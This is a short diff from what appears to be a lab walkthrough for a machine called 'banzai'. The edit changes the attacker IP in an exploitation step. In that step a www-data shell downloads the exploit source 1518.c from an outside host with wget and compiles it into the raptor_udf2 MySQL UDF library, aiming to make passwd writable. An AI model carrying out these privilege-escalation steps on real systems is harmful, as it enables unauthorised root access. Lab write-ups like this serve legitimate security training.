@@ -3128,7 +3128,7 @@ root      1551  0.0  0.0  12780  1020 pts/0    S+   20:12   0:00 grep mysql
 
 4. Exploitation, giving writable permission to passwd at the end. 
 ```
-www-data@banzai:/var/www$ wget http://192.168.45.189:21/1518.c
+www-data@banzai:/var/www$ wget http://192.168.45.196:21/1518.c
 www-data@banzai:/var/www$ gcc -g -c 1518.c -o raptor_udf2.o -fPIC
 www-data@banzai:/var/www$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 
